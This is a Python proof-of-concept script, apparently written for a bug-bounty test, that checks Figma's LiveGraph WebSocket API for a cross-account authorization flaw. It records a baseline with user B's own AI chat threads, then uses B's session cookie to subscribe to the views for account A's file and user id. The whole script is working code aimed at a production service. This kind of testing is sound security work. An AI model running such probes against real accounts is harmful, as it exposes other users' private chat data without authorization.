# -*- coding: utf-8 -*-
"""AI 线程 view 探测(基线+越权)
阶段1: B 身份订阅 FileAiChatThreadsView(ownerId=FILE_B)/PaginatedUserAiChatThreadsView(UID_B)
阶段2: B 身份订阅同 view 打 A 的 FILE_A/UID_A → 若返回 A 线程数据即越权
协议参考 PlanByFileKey(H1-plan-leak.md),viewHash 占位 abab...
"""
import json, sys, time, websocket
sys.path.insert(0, 'F:/scan/figma_report')
from _figma_creds import COOKIE_B, UID_A, UID_B, FILE_A, FILE_B

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36'


def lg_connect(uid, file_key):
    client_url = 'https://www.figma.com/file/%s' % file_key
    url = ('wss://www.figma.com/api/livegraph?pv=1&userId=%s&anonUserId=&clientType=web'
           '&preload=%%7B%%7D&requestedProtocolVersion=2&clientUrl=%s&connectionType=initial&reconnect=0'
           % (uid, client_url))
    ws = websocket.create_connection(url, timeout=12, header=['User-Agent: ' + UA, 'Cookie: ' + COOKIE_B])
    ws.send(json.dumps({'messageType': 'auth', 'clientType': 'web',
                        'args': {'userId': uid, 'anonymousUserId': None},
                        'tags': {'clientType': 'web', 'clientUrl': client_url},
                        'clientRequestedVersion': 2}))
    time.sleep(0.5)
    return ws


def sub_and_drain(ws, view_name, args, label, wait=6):
    ws.send(json.dumps({'messageType': 'subscribe', 'viewName': view_name,
                        'viewHash': 'abababababababababababababababab',
                        'loadType': 'initial', 'args': args}))
    msgs = []
    ws.settimeout(wait)
    try:
        while True:
            msgs.append(ws.recv())
    except Exception:
        pass
    print('### %s | %s %s' % (label, view_name, json.dumps(args)[:140]))
    for m in msgs:
        print('   ', m[:1200].replace('\n', ' '))
    print()
    return msgs


# ---- 阶段1:基线(B 自己) ----
ws = lg_connect(UID_B, FILE_B)
sub_and_drain(ws, 'FileAiChatThreadsView', {'ownerId': FILE_B}, 'BASE-B-file')
sub_and_drain(ws, 'PaginatedUserAiChatThreadsView',
              {'firstPageSize': 20, 'ownerId': UID_B, 'userId': UID_B}, 'BASE-B-user')
ws.close()
time.sleep(2)

# ---- 阶段2:越权(B 身份查 A) ----
ws = lg_connect(UID_B, FILE_A)
sub_and_drain(ws, 'FileAiChatThreadsView', {'ownerId': FILE_A}, 'XAC-A-file')
sub_and_drain(ws, 'PaginatedUserAiChatThreadsView',
              {'firstPageSize': 20, 'ownerId': UID_A, 'userId': UID_A}, 'XAC-A-user')
ws.close()
